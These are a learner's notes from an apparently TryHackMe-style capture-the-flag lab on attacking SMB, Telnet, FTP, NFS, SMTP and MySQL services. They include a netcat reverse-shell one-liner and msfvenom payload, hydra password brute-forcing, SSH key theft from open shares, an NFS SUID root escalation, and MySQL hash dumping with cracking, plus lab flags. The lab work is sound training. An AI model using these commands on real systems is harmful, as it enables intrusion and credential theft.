# Network Services

## Part 1

### SMB

#### Understanding SMB

- The Server Message Block Protocol (SMB) is a protocol used for servers to share access to files, ports, etc. on a network for any clients that want them
- Known as a _response-request_ protocol. It sends multiple requests between the client and server to establish a connection
- Usually connect over TCP/IP but also connect over NetBEUI or IPX/SPX
- Once a connection is established, a client sends commands to the server to allow access to shares, files, etc.
- Seen on Windows since Windows 95, on Unix as well (known as Samba)

##### Questions

- What does SMB stand for? [_Server Message Block_]
- What type of protocol is SMB? [_response-request_]
- What do clients connect to servers using? [_TCP/IP_]
- What systems does Samba run on? [*Unix*]

#### Enumerating SMB

IP: `export THM_IP=10.10.182.111`

- _Enumeration_ is essentially gathering info about a target box to find ways to attack/exploit it
  - Must be done for the attack to be successful, as blindly sending exploits can crash a system
  - Can be used to grab passwords, network info, hostnames, app data, services, etc.

- There are typically SMB shares on servers that can be connected to and used to view/transfer files
- SMB tends to be a good starting point for someone looking for exploit a box
- `nmap` should be step 1
- `enum4linux` is a tool used to enumerate SMB shares.
  - A wrapper around Samba tools
  - Can make it faster and easier to extract info
  - Usage: `enum4linux [opts] <ip>`
    - `-U` - get list of users
    - `-M` - get list of machines
    - `-N` - get list dump of names (different than the previous two)
    - `-S` - get list of shares
    - `-P` - get password policy info
    - `-G` - get list of groups with members
    - `-a` - all of the above

##### Questions

- Conduct an nmap scan of your choosing, How many ports are open? [`3`]
  - Ran `nmap -sC -sV -oN nmap/net_svcs_1_smb_1 $THM_IP`
- What ports is SMB running on? [`139/445`]
- Ran `enum4linux -A $THM_IP | tee enum4linux/net_svcs_1_smb.log`
  - Let's get started with Enum4Linux, conduct a full basic enumeration. For starters, what is the workgroup name? [`WORKGROUP`]
    - Under `Enumerating Workgroup/Domain` section
  - What comes up as the name of the machine? [`POLOSMB`]
    - _I think_ it's the info on the first line of the `OS information` section
  - What operating system version is running? [`6.1`]
    - `OS information` section
  - What share sticks out as something we might want to investigate? [`profiles`]
    - Under the `Share Enumeration` section
    - Sticks out because that would be users we could login as and exploit

#### Exploiting SMB

- A few different ways about going at it. Most likely is misconfigurations in the system.
  - Can use others found on `searchsploit smb`. Out of those, seems like remote code execution is probably a good place to start

- From the scan, we know the location of the share (Port 139) and an interesting name to take a look at (`profiles`)
- `smbclient` is a good go to client
  - `-U` to specify a user
  - `-p` for the port

##### Questions

- What would be the correct syntax to access an SMB share called "secret" as user "suit" on a machine with the IP 10.10.10.2 on the default port? [`smbclient //10.10.10.2/secret -U suit`]
- Great! Now you've got a hang of the syntax, let's have a go at trying to exploit this vulnerability. You have a list of users, the name of the share (smb) and a suspected vulnerability.
  - Ran `smbclient //$THM_IP/profiles -U cactus`
    - Was supposed to use `-U Anonymous` as per the next step but the `cactus` user worked without a password as well

- Lets see if our interesting share has been configured to allow anonymous access, I.E it doesn't require authentication to view the files. We can do this easily by:
  - using the username "Anonymous"
  - connecting to the share we found during the enumeration stage
  - and not supplying a password.
Does the share allow anonymous access? [_Yes_]
    - I found several files. Had to tinker to figure out how the fuck to even look at them, but I got it to download the whole share using `mget *` then looked at them on my local
    - Should probably look deeper into `smbclient` commands

- Great! Have a look around for any interesting documents that could contain valuable information. Who can we assume this profile folder belongs to? [_John Cactus_]
- What service has been configured to allow him to work from home? [_ssh_]
- Okay! Now we know this, what directory on the share should we look in? [`.ssh`]
- This directory contains authentication keys that allow a user to authenticate themselves on, and then access, a server. Which of these keys is most useful to us? [`id_rsa`]
- Download this file to your local machine, and change the permissions to "600" using "chmod 600 [file]". Now, use the information you have already gathered to work out the username of the account. Then, use the service and key to log-in to the server. What is the smb.txt flag? [`THM{smb_is_fun_eh?}`]
  - Used `ssh .ssh/id_rsa cactus@$THM_IP` then `cat smb.txt`

### Telnet

#### Understanding Telnet

- Telnet is an app protocol which allows you to connect to remote machines to perform commands on them (essentially pre-SSH SSH)
- (^^^ reason being...) Telnet sends everything in clear text, which obviously is not good security-wise. SSH has mostly replaced it
- Connect using the Telnet protocol through the `telnet <ip> <port>` command, using specific Telnet commands in the prompt

##### Questions

- What is Telnet? [_application protocol_]
- What has slowly replaced Telnet? [_ssh_]
- How would you connect to a Telnet server with the IP 10.10.10.3 on port 23? [`telnet 10.10.10.3 23`]
- The lack of what, means that all Telnet communication is in plaintext? [_encryption_]
  - This was probably more of a research question, but I just kinda guessed lol, kinda obvious though

#### Enumerating Telnet

- Need to be thorough

##### Questions

- How many ports are open on the target machine? [_1_]
- What port is this? [`8012`]
- This port is unassigned, but still lists the protocol it's using, what protocol is this? [_tcp_]
- Now re-run the nmap scan, without the -p- tag, how many ports show up as open? [_0_]
- Based on the title returned to us, what do we think this port could be used for? [_a backdoor_]
  - In nmap scan: `SKIDY'S BACKDOOR`
- Who could it belong to? Gathering possible usernames is an important step in enumeration. [_skidy_]

#### Exploiting Telnet

- There are CVEs in `searchsploit` for Telnet. Being un-encrypted, Telnet is very insecure and has poor access control
- Most likely with Telnet, you'll find some misconfigurations
- We know
  - There is a poorly hidden telnet service running on this machine
  - The service itself is marked "backdoor"
  - We have possible username of "Skidy" implicated

- A reverse shell is a type of shell in which the target box communicates back to the client box
  - The client would have a port open, which would receive a connection, resulting in code or a command to be executed being archived

##### Questions

- Connect to the telnet port
  - `telnet $THM_IP 8012`
- What's the welcome message? [`SKIDY'S BACKDOOR`]
- Do we get a return on any input we enter into the telnet session? [_No_]
- Run a tcpdump listener using `sudo tcpdump ip proto \\icmp -i tun0`
- Run `ping 10.6.89.232 -c 1` on the telnet machine
- Generate a reverse shell payload using msfvenom ON THE CLIENT MACHINE: `msfvenom -p cmd/unix/reverse_netcat lhost=10.6.89.232 lport=4444 R`
  - It made it sound like this needed to be ran on the telnet session. It creates a command to run on telnet

```
    -p = payload
    lhost = our local host IP address (this is your machine's IP address)
    lport = the port to listen on (this is the port on your machine)
    R = export the payload in raw format
```

- Start a netcat listener on the client machine: `nc -lvp 4444`
- What is the flag? [`THM{y0u_g0t_th3_t3ln3t_fl4g}`]
  - Ran `mkfifo /tmp/cgmutgm; nc 10.6.89.232 4444 0</tmp/cgmutgm | /bin/sh >/tmp/cgmutgm 2>&1; rm /tmp/cgmutgm`, which came from the `msfvenom` command

### FTP

#### Understanding FTP

- File Transfer Protocol (FTP) allows you to, not obviously at all, transfer files over a network. It uses a client-server model, which is more reliable (especially more so than SMB)
- Typical session operates using a command/control channel and a data channel
  - The command channel is used for transmitting commands (the snozzberries taste like snozzberries)
  - The data channel transfers the data (why the fuck did I buy premium lmao)

- The client-server model: the client initiates the connection with server, the server validates the credentials (performs authentication. BOOM, DOUBLE LESSON KNOWLEDGE!) then will open the session if it passes
- Two types of connections
  - Active: the client opens a port and listens. Server is required to actively connect to it
  - Passive: the server opens a port and listens passively. The client connects to the open port

- Separation of channels allows for quick file transfer

##### Questions

- What communications model does FTP use? [_client-server_]
- What's the standard FTP port? [_21_]
  - Big brain! No Google search needed! Ha!
- How many modes of FTP connection are there? [_2_]
  - Active and Passive

#### Enumerating FTP

- IP: `export THM_IP=10.10.76.129`

- Gonna use an anonymous FTP login exploit to see if there are any files to grab
- Gonna use `ftp`, though other clients exist
- Some variants of ftp servers have different exploits available
- Common one is an exploit which lets you run `cwd` before auth
  - [`cwd` exploit](https://www.exploit-db.com/exploits/20745)  

##### Questions

- Run an nmap scan of your choice.
  - `nmap -p- -sC -sV -oN nmap/net_svcs_1_ftp_1 $THM_IP`
- How many ports are open on the target machine? [_2_]
- What port is ftp running on? [`21`]
- What variant of FTP is running on it? [`vsftpd`]
- Great, now we know what type of FTP server we're dealing with we can check to see if we are able to login anonymously to the FTP server. We can do this using by typing "ftp [IP]" into the console, and entering "anonymous", and no password when prompted. What is the name of the file in the anonymous FTP directory? [`PUBLIC_NOTICE.txt`]
  - Logged in with `ftp $THM_IP` then put the username `anonymous` and used no password
- What do we think a possible username could be? [`mike`]
  - Found files using `ls`
  - Used the command `get PUBLIC_NOTICE.txt` to download the file, name `Mike` was in there

#### Exploiting FTP

- Data sent through both FTP channels is un-encrypted
- Can use a MITM attack to gather data (including passwords)
  - [Article using ARP-Poisoning](https://www.jscape.com/blog/bid/91906/Countering-Packet-Sniffers-Using-Encrypted-FTP)

- Best to start with weak or default password configs
- First try can be a bruteforce on `mike` since we think there might be something there
- Use `hydra` for bruteforcing
  - Attacks many different protocols, including FTP
  - Syntax example: `hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp`
    - `hydra`: Runs the hydra tool
    - `-t 4`: Number of parallel connections per target
    - `-l [user]`: Points to the user who's account you're trying to compromise
    - `-P [path to dictionary]`: Points to the file containing the list of possible passwords
    - `-vV`: Sets verbose mode to very verbose, shows the login+pass combination for each attempt
    - `[machine IP]`: The IP address of the target machine
    - `ftp` / `protocol`: Sets the protocol

##### Questions

- What is the password for the user "mike"? [`password`]
  - `hydra -t 4 -l mike -P /usr/share/wordlists/rockyou.txt -vV $THM_IP ftp`
  - It's `mike:password`. Nice...
- What is ftp.txt? [`THM{y0u_g0t_th3_ftp_fl4g}`]

#### Extra Info

- [Info on `smbclient`](https://www.oreilly.com/openbook/samba/book/appd_01.htmlt)
- [Info on `tcpdump`](http://www.tcpdump.org/tcpdump_man.html)
- [Info on `msfvenom`](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)
- [RFC for FTP](https://www.ietf.org/rfc/rfc959.txt)
- [Some medium article idk](https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef)
- [Remote Service Exploits](https://attack.mitre.org/techniques/T1210/)
- [NSA Warning about VPN vulns](https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/)

## Part 2

### NFS

- IP: `export THM_IP=10.10.223.92`

- Network File System (NFS) allows a system to share directories with connected users
- Done by mounting all or a portion of a file system on a server, which can be accessed by anyone authorized to see/edit/execute it
- [How NFS Works - from shithead corporation Oracle](https://docs.oracle.com/cd/E19683-01/816-4882/6mb2ipq7l/index.html)
  - Client mounts a directory from a NFS to their local system as if it were a normal USB/flash storage/CD/etc.
  - Mount service then tries to connect to the relevant daemon using RPC
  - Server checks for relevant perms to mount the requested directory
  - Then it returns a unique handle for each file so that the client can access it
  - To access a file, an RPC call is placed to the NFS daemon, which takes params like the file handle, the name of the file, the user's ID, the user's group ID, etc.
- NFS is used everywhere, a bunch in Windows, especially Windows Server

- We can enumerate NFS through using `nfs-common`, which has `lockd`, `statd`, _`showmount`_, `nfsstat`, `gssd`, `idmapd`, _`mount.nfs`_, etc.
  - `showmount` and `mount.nfs` are the most important to look at
  - [`nfs-common` docs](https://packages.ubuntu.com/xenial/nfs-common)

- Mounting a share example: `sudo mount -t nfs IP:share /tmp/mount/ -nolock`
  - `mount`: Execute the mount command
  - `-t nfs`: Type of device to mount, then specifying that it's NFS
  - `IP:share`: The IP Address of the NFS server, and the name of the share we wish to mount
  - `-nolock`: Specifies not to use NLM locking

- If you find you can SSH in, you might login as a low privilege user
- Root users by default can't login to NFS, and are assigned the `nfsnobody` user which has very low perms. This is called `root-squashing`
- If it's turned off though, we can create SUID bit files which can give us root access
- Files with the SUID bit can be ran by anyone as if they are the user/group that made the file
  - Can use to create a shell with root priv.
- General steps
  - Access NFS
  - Gain low priv. shell
  - Upload a bash executable to the share
  - Set SUID perms through NFS due to misconfigured root squash
  - Login through SSH
  - Execute SUID bit bash exe.
  - ROOT ACCESS


#### Questions

**Understanding**

- What does NFS stand for? [_Network File System_]
- What process allows an NFS client to interact with a remote directory as though it was a physical device? [_Mounting_]
- What does NFS use to represent files and directories on the server? [_file handle_]
- What protocol does NFS use to communicate between the server and client? [_rpc_]
- What two pieces of user data does the NFS server take as parameters for controlling user permissions? [_user id / group id_]
- Can a Windows NFS server share files with a Linux client and vice versa? [_Yes_]
- What is the latest version of NFS? [_4.2_]
  - Google search: `nfs versions`
  - Found: [Wiki Page for NFS, v4.2 is mentioned](https://en.wikipedia.org/wiki/Network_File_System#NFSv4)

**Enumeration**

- Conduct a thorough port scan scan of your choosing, how many ports are open? [_7_]
  - Ran `nmap -p- -sC -sV -oN nmap/net_svcs_2_nfs_1 $THM_IP`
- Which port contains the service we're looking to enumerate? [_2049_]
- Now, use `/usr/sbin/showmount -e [IP]` to list the NFS shares, what is the name of the visible share? [_/home_]
  - Ran `showmount -e $THM_IP`
- Time to mount the share to our local machine! First, use `mkdir /tmp/mount` to create a directory on your machine to mount the share to. This is in the `/tmp` directory- so be aware that it will be removed on restart. Then, use the mount command we broke down earlier to mount the NFS share to your local machine. Change directory to where you mounted the share- what is the name of the folder inside? [_cappucino_]
- Interesting! Let's do a bit of research now, have a look through the folders. Which of these folders could contain keys that would give us remote access to the server? [_.ssh_]
- Which of these keys is most useful to us? [_id_rsa_]
- Copy this file to a different location your local machine, and change the permissions to `600` using `chmod 600 [file]`. Assuming we were right about what type of directory this is, we can pretty easily work out the name of the user this key corresponds to. Can we log into the machine using `ssh -i <key-file> <username>@<ip>`? [_Yes_]

**Exploit**

- Go to `/tmp/mount/cappucino`
- Download raw exe. from `https://github.com/TheRealPoloMints/Blog/blob/master/Security%20Challenge%20Walkthroughs/Networks%202/bash`
- Copy to the `/tmp/mount/cappucino`
- Set owner to root using `sudo chown root bash`
- Add SUID perms using `sudo chmod +s bash`
- Add exe. perms using `sudo chmod +x bash`
- SSH in as `cappucino`
- Run the `bash` file
- We are root!
- Go to `/root` and open the flag in `root.txt`
- The flag is: `THM{nfs_got_pwned}`

### SMTP

- IP: `export THM_IP=10.10.29.47`

- Simple Mail Transfer Protocol (SMTP) allows you to send emails
- A protocol pair with POP/IMAP is required, which allows us to send out mail and receive mail
- SMTP servers serve three purposes
  - Verifies who is sending emails through it
  - Sends outgoing mail
  - If it can't be delivered, it sends it back to the original sender
- Post Office Protocol (POP) and Internet Message Access Protocol (IMAP) are protocols which are used to transfer email between a client and mail server
- POP downloads the inbox from the mail server. IMAP will sync the current inbox with new mail on the server, downloading anything new.
- Changes on one machine, over IMAP, will persist if you sync. the inbox on another machine
- The Process
  - User sends request to SMTP server with data and where to put it
  - SMTP server "sorts" it like a normal post office
  - Through unnamed processes for some reason, it ends up on a POP/IMAP server, which then gives it to the recipient

- The Advanced Process
  1. The mail user agent, which is either your email client or an external program. connects to the SMTP server of your domain, e.g. smtp.google.com. This initiates the SMTP handshake. This connection works over the SMTP port- which is usually 25. Once these connections have been made and validated, the SMTP session starts.
  2. The process of sending mail can now begin. The client first submits the sender, and recipient's email address- the body of the email and any attachments, to the server.
  3. The SMTP server then checks whether the domain name of the recipient and the sender is the same.
  4. The SMTP server of the sender will make a connection to the recipient's SMTP server before relaying the email. If the recipient's server can't be accessed, or is not available- the Email gets put into an SMTP queue
  5. Then, the recipient's SMTP server will verify the incoming email. It does this by checking if the domain and user name have been recognized. The server will then forward the email to the POP or IMAP server, as shown in the diagram above.
  6. The E-Mail will then show up in the recipient's inbox.

![Email process](https://raw.githubusercontent.com/polo-sec/writing/master/Security%20Challenge%20Walkthroughs/Networks%202/untitled.png)

- SMTP runs on both Windows and Linux

- Prior to hacking a box with smtp, fingerprinting is needed. Metasploit's `smtp_version` module helps us exploit this (scans a range of IPs to determine the mail version)
- SMTP has two internal commands that allow for a listing of users to be returned: VRFY (confirming the name of valid users) and EXPN (reveals the actual addresses of the user's aliases and the lists of emails)
  - Can be done manually with a Telnet, but Metasploit has a `smtp_enum` module which does it for us with a list of IPs and a wordlist
  - Other tools like `smtp-user-enum` can do this as well (and sometimes better due to this particular one being able to find OS-level users on Solaris, which inspects the responses to the VRFY, EXPN, and RCPT TO commands)
  - Can be adapted in the future just in case you want to use something else other than Metasploit

- Enumerating found us a user account name and the type of SMTP server that's being ran. The only other open port is 22/SSH. We can use `hydra` again to bruteforce the SSH password
- Example for ssh: `hydra -t 16 -l USERNAME -P /usr/share/wordlists/rockyou.txt -vV 10.10.29.47 ssh`
  - `hydra`: Runs the hydra tool
  - `-t 16`: Number of parallel connections per target
  - `-l [user]`: Points to the user who's account you're trying to compromise
  - `-P [path to dictionary]`: Points to the file containing the list of possible passwords
  - `-vV`: Sets verbose mode to very verbose, shows the login+pass combination for each attempt
  - `[machine IP]`: The IP address of the target machine
ssh / protocol	Sets the protocol

#### Questions

**Understanding**

- What does SMTP stand for? [_Simple Mail Transfer Protocol_]
- What does SMTP handle the sending of? [_emails_]
- What is the first step in the SMTP process? [_smtp handshake_]
- What is the default SMTP port? [_25_]
- Where does the SMTP server send the email if the recipient's server is not available? [_smtp queue_]
- On what server does the Email ultimately end up on? [_POP/IMAP_]

**Enumerating**

- First, lets run a port scan against the target machine, same as last time. What port is SMTP running on? [``]
  - Ran `nmap -p- -sC -sV -oN nmap/net_sys_2_smtp_1 $THM_IP`
  - I regret this, it's been 30 minutes and it's still scanning...
- Okay, now we know what port we should be targeting, let's start up Metasploit. What command do we use to do this? [`msfconsole`]
- Let's search for the module "smtp_version", what's it's full module name? [`auxiliary/scanner/smtp/smtp_version`]
  - Used `search smtp_version`
- Great, now- select the module and list the options. How do we do this? [`options`]
  - Wording here is bad. They assume you already selected, that wasn't clear lmao
  - Run `use 0` after the search then `options`
- Have a look through the options, does everything seem correct? What is the option we need to set? [`RHOSTS`]
  - `RHOSTS` is the only option without a default value. Other values look fine for this case
- Set that to the correct value for your target machine. Then run the exploit. What's the system mail name? [`polosmtp.home`]

```
msf6 auxiliary(scanner/smtp/smtp_version) > run

[+] 10.10.29.47:25        - 10.10.29.47:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
[*] 10.10.29.47:25        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```  

- What Mail Transfer Agent (MTA) is running the SMTP server? This will require some external research. [`Postfix`]
  - I'll be honest, I kinda just guessed lol. I'm guessing it'll always be next to the mail name and ESMTP
  - Also can find info [here](https://afreshcloud.com/sysadmin/mail-terminology-mta-mua-msa-mda-smtp-dkim-spf-dmarc)
- Good! We've now got a good amount of information on the target system to move onto the next stage. Let's search for the module "smtp_enum", what's it's full module name? [`auxiliary/scanner/smtp/smtp_enum`]
- We're going to be using the "top-usernames-shortlist.txt" wordlist from the Usernames subsection of seclists (/usr/share/wordlists/SecLists/Usernames if you have it installed). What option do we need to set to the wordlist's path? [`USER_FILE`]
  - It was actually located in `usr/share/seclists/Usernames/top-usernames-shortlist.txt` after I installed it
- Okay! Now that's finished, what username is returned? [`administrator`]

**Exploiting**

- Run `hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV $THM_IP ssh`
- What is `administrator` password? [`alejandro`]
  - See `hydra/net_sys_2_smtp.log`
- What is the flag? [`THM{who_knew_email_servers_were_c00l?}`]
  - SSH into the admin account then cat `smtp.txt`

### MySQL

- IP: `export THM_IP=10.10.43.160`

- MySQL is a relational database management system (RDBMS) using the structred query language (SQL)
- Uses the client-server model, using SQL to communicate
- MySQL is made up of the server and a bunch of utilities it has to keep tables and whatnot
- Usually used in the LAMP (Linux, Apache, MySQL, PHP) stack
- Extra docs:
  - MySQL docs: https://dev.mysql.com/doc/dev/mysql-server/latest/PAGE_SQL_EXECUTION.html  
  - w3schools my_sql PHP: https://www.w3schools.com/php/php_mysql_intro.asp

- In getting info about a server, MySQL probably isn't gonna be a starting point. Probably will get creds from other services then use MySQL
- `nmap`'s `mysql-enum` vuln script can be used as well

- From the enumeration, we know
  - A mysql user (`root:password`)
  - The mysql version
  - The databases
- In mysql, schemas and databases are basically the same. That isn't the case for all RDBMS
- MySQL has hashes which are used for more efficient indexing
- In this, we're gonna find password hashes stored in the db by an app



#### Questions

**Understanding**

- What type of software is MySQL? [_relational database management system_]
- What language is MySQL based on? [_sql_]
- What communication model does MySQL use? [_client-server_]
- What is a common application of MySQL? [_back end database_]
- What major social network uses MySQL as their back-end database? [_facebook_]
  - Hint gave it away: `Cambridge Analytica scandal`

**Emumerating**

- As always, let's start out with a port scan, so we know what port the service we're trying to attack is running on. What port is MySQL using? [`3306`]
- Good, now- we think we have a set of credentials. Let's double check that by manually connecting to the MySQL server. We can do this using the command `mysql -h [IP] -u [username] -p`
  - Ran `mysql -h $THM_IP -u root -p`
- Okay, we know that our login credentials work. Lets quit out of this session with "exit" and launch up Metasploit.
- We're going to be using the "mysql_sql" module. Search for, select and list the options it needs. What three options do we need to set? (in descending order). [`PASSWORD/RHOSTS/USERNAME`]
- Run the exploit. By default it will test with the "select version()" command, what result does this give you? [`5.7.29-0ubuntu0.18.04.1`]

```
msf6 auxiliary(admin/mysql/mysql_sql) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
USERNAME => root
msf6 auxiliary(admin/mysql/mysql_sql) > set RHOSTS 10.10.43.160
RHOSTS => 10.10.43.160
msf6 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 10.10.43.160

[*] 10.10.43.160:3306 - Sending statement: 'select version()'...
[*] 10.10.43.160:3306 -  | 5.7.29-0ubuntu0.18.04.1 |
[*] Auxiliary module execution completed
```

- Great! We know that our exploit is landing as planned. Let's try to gain some more ambitious information. Change the "sql" option to "show databases". how many databases are returned? [`4`]

```
msf6 auxiliary(admin/mysql/mysql_sql) > set SQL show databases
SQL => show databases
msf6 auxiliary(admin/mysql/mysql_sql) > run
[*] Running module against 10.10.43.160

[*] 10.10.43.160:3306 - Sending statement: 'show databases'...
[*] 10.10.43.160:3306 -  | information_schema |
[*] 10.10.43.160:3306 -  | mysql |
[*] 10.10.43.160:3306 -  | performance_schema |
[*] 10.10.43.160:3306 -  | sys |
[*] Auxiliary module execution completed
```

**Exploiting**

- First, let's search for and select the "mysql_schemadump" module. What's the module's full name? [`auxiliary/scanner/mysql/mysql_schemadump`]
- Great! Now, you've done this a few times by now so I'll let you take it from here. Set the relevant options, run the exploit. What's the name of the last table that gets dumped? [`x$waits_global_by_latency`]
- Awesome, you have now dumped the tables, and column names of the whole database. But we can do one better... search for and select the "mysql_hashdump" module. What's the module's full name? [`auxiliary/scanner/mysql/mysql_hashdump`]
- Again, I'll let you take it from here. Set the relevant options, run the exploit. What non-default user stands out to you? [`carl`]

```
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set PASSWORD password
PASSWORD => password
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set USERNAME root
USERNAME => root
msf6 auxiliary(scanner/mysql/mysql_hashdump) > set RHOSTS 10.10.43.160
RHOSTS => 10.10.43.160
msf6 auxiliary(scanner/mysql/mysql_hashdump) > run

[+] 10.10.43.160:3306     - Saving HashString as Loot: root:
[+] 10.10.43.160:3306     - Saving HashString as Loot: mysql.session:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.43.160:3306     - Saving HashString as Loot: mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
[+] 10.10.43.160:3306     - Saving HashString as Loot: debian-sys-maint:*D9C95B328FE46FFAE1A55A2DE5719A8681B2F79E
[+] 10.10.43.160:3306     - Saving HashString as Loot: root:*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
[+] 10.10.43.160:3306     - Saving HashString as Loot: carl:*EA031893AA21444B170FC2162A56978B8CEECE18
[*] 10.10.43.160:3306     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

- Another user! And we have their password hash. This could be very interesting. Copy the hash string in full, like: bob:*HASH to a text file on your local machine called "hash.txt". What is the user/hash combination string? [`carl:*EA031893AA21444B170FC2162A56978B8CEECE18`]
- Now, we need to crack the password! Let's try John the Ripper against it using: "john hash.txt" what is the password of the user we found? [`doggie`]
- Awesome. Password reuse is not only extremely dangerous, but extremely common. What are the chances that this user has reused their password for a different service? What's the contents of MySQL.txt [`THM{congratulations_you_got_the_mySQL_flag}`]

### Extra info

- [RPC](https://searchapparchitecture.techtarget.com/definition/Remote-Procedure-Call-RPC)
- How NFS Works
  - [Datto](https://www.datto.com/library/what-is-nfs-file-share)
  - [SourceForge](http://nfs.sourceforge.net/)
  - [ArchWiki](https://wiki.archlinux.org/index.php/NFS)

- Read into whatever the fuck SUID is
- SMTP
  - https://computer.howstuffworks.com/e-mail-messaging/email3.htm
  - https://www.afternerd.com/blog/smtp/
- Need to look into both Metasploit and John The Ripper
- Need to also try the alternate methods for SMTP and MySQL
- https://web.mit.edu/rhel-doc/4/RH-DOCS/rhel-sg-en-4/ch-exploits.html
- https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/
